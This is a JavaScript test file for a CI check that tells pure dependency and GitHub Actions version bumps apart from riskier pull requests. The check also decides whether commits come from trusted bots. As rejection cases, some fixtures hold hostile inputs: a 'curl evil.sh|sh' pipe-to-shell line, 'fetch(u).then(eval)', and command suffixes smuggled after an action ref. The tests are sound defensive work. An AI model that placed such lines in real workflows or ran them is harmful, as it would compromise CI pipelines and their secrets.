import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isDependencyOnlyChange, commitsAreTrusted, FILES_API_CAP, COMMITS_CAP } from './dependency-only.mjs';

const f = (filename, extra = {}) => ({ filename, status: 'modified', ...extra });
const wf = (patch, extra = {}) => f('.github/workflows/ci.yml', { patch, ...extra });
const exempt = (files) => isDependencyOnlyChange(files).dependencyOnly;
const bump = (o, n, dash = '- ') =>
  `@@ -1,3 +1,3 @@\n ctx\n-      ${dash}uses: ${o}\n+      ${dash}uses: ${n}\n ctx`;

test('manifest and lockfile bump is dependency-only', () => {
  assert.equal(exempt([f('package.json'), f('yarn.lock')]), true);
});

test('nested manifests and .NET files qualify', () => {
  const names = ['src/app/package.json', 'pnpm-lock.yaml', 'npm-shrinkwrap.json', 'package-lock.json',
    'src/A/A.csproj', 'Directory.Packages.props', 'Directory.Build.props', 'src/packages.lock.json', 'global.json'];
  assert.equal(exempt(names.map((n) => f(n))), true);
});

test('a source file rules it out and is named', () => {
  assert.deepEqual(isDependencyOnlyChange([f('package.json'), f('src/index.ts')]), { dependencyOnly: false, offending: 'src/index.ts' });
});

test('lookalike names do not qualify (package.json.sh, foo.csproj.bak)', () => {
  assert.equal(exempt([f('package.json.sh')]), false);
  assert.equal(exempt([f('foo.csproj.bak')]), false);
  assert.equal(exempt([f('scripts/yarn.lock.js')]), false);
});

test('status removed of a dependency file is not exempt', () => {
  assert.equal(exempt([f('package.json', { status: 'removed' })]), false);
});

test('non-array and empty input are not exempt', () => {
  assert.equal(exempt(null), false);
  assert.equal(exempt('package.json'), false);
  assert.equal(exempt([]), false);
});

test('possibly truncated listing is not exempt', () => {
  assert.equal(exempt(Array.from({ length: FILES_API_CAP }, (_, i) => f(`d${i}/package.json`))), false);
});

test('rename with previous_filename, renamed status, and previous_filename equal to filename', () => {
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'x/y.js' })]), false);
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'package.json' })]), false);
  assert.equal(exempt([f('package.json', { previous_filename: 'package.json' })]), true);
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'), { status: 'renamed', previous_filename: '.github/workflows/old.yml' })]), false);
});

test('ref-only bump accepted', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'))]), true);
});

test('SHA pin with trailing comment bump accepted', () => {
  const a = 'actions/checkout@' + 'a'.repeat(40) + ' # v6';
  const b = 'actions/checkout@' + 'b'.repeat(40) + ' # v7';
  assert.equal(exempt([wf(bump(a, b))]), true);
});

test('uses without list dash accepted when paired; sub-path actions accepted', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2', ''))]), true);
  assert.equal(exempt([wf(bump('a/b/sub/x@v1', 'a/b/sub/x@v2'))]), true);
});

test('new step (pure addition) rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n ctx\n+      - uses: evil/x@v1\n ctx')]), false);
});

test('retargeting to another owner rejected', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'evil/checkout@v6'))]), false);
});

test('run-block injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       run: |\n+        uses: $(curl evil.sh|sh)\n ctx')]), false);
});

test('github-script injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       script: |\n+        uses: fetch(u).then(eval)\n ctx')]), false);
});

test('removal-only patch rejected', () => {
  assert.equal(exempt([wf('@@ -1,3 +1,2 @@\n ctx\n-      - uses: actions/hardening@v1\n ctx')]), false);
});

test('extra characters after the ref rejected', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2;curl evil'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 && x'))]), false);
});

test('docker:// and local actions rejected', () => {
  assert.equal(exempt([wf(bump('docker://alpine:3.18', 'docker://alpine:3.19'))]), false);
  assert.equal(exempt([wf(bump('./local@v1', './local@v2'))]), false);
});

test('indentation or list-dash change within a pair rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+    - uses: a/b@v2')]), false);
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+      uses: a/b@v2')]), false);
});

test('mismatched counts rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1,2 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2\n+      - uses: a/c@v2')]), false);
});

test('.yaml extension and workflow in a subfolder are not exempt', () => {
  const p = bump('a/b@v1', 'a/b@v2');
  assert.equal(exempt([f('.github/workflows/ci.yaml', { patch: p })]), false);
  assert.equal(exempt([f('.github/workflows/sub/ci.yml', { patch: p })]), false);
});

test('context-only patch, missing patch, status removed/added workflow rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,2 @@\n ctx\n ctx')]), false);
  assert.equal(exempt([f('.github/workflows/ci.yml')]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'removed' })]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'added' })]), false);
});

// ---- commitsAreTrusted ----
const EX = ['dependabot[bot]', 'renovate[bot]'];
const c = (login, verified) => ({ author: login === null ? null : { login }, commit: { verification: { verified } } });
const manifests = [f('package.json'), f('yarn.lock'), f('sub/package-lock.json')];

test('verified bot commits are trusted', () => {
  assert.equal(commitsAreTrusted([c('dependabot[bot]', true), c('renovate[bot]', true)], [f('src/a.ts')], EX), true);
});

test('unverified Dependabot commit is not trusted', () => {
  assert.equal(commitsAreTrusted([c('dependabot[bot]', false)], manifests, EX), false);
  assert.equal(commitsAreTrusted([{ author: { login: 'dependabot[bot]' } }], manifests, EX), false);
});

test('human commit, human merge commit and author-less commit are not trusted', () => {
  assert.equal(commitsAreTrusted([c('dependabot[bot]', true), c('alice', true)], manifests, EX), false);
  assert.equal(commitsAreTrusted([c('dependabot[bot]', true), c('bob', true)], manifests, EX), false);
  assert.equal(commitsAreTrusted([c(null, true)], manifests, EX), false);
});

test('pin app commit with manifest-only files is trusted even unsigned', () => {
  assert.equal(commitsAreTrusted([c('dependabot[bot]', true), c('easylife-agents[bot]', false)], manifests, EX), true);
});

test('pin app commit touching a .mjs or a removed manifest is not trusted', () => {
  assert.equal(commitsAreTrusted([c('easylife-agents[bot]', false)], [f('package.json'), f('x.mjs')], EX), false);
  assert.equal(commitsAreTrusted([c('easylife-agents[bot]', false)], [f('package.json', { status: 'removed' })], EX), false);
});

test('empty, non-array and 250 commits are not trusted', () => {
  assert.equal(commitsAreTrusted([], manifests, EX), false);
  assert.equal(commitsAreTrusted(null, manifests, EX), false);
  assert.equal(commitsAreTrusted(Array.from({ length: COMMITS_CAP }, () => c('dependabot[bot]', true)), manifests, EX), false);
  assert.equal(commitsAreTrusted(Array.from({ length: COMMITS_CAP - 1 }, () => c('dependabot[bot]', true)), manifests, EX), true);
});
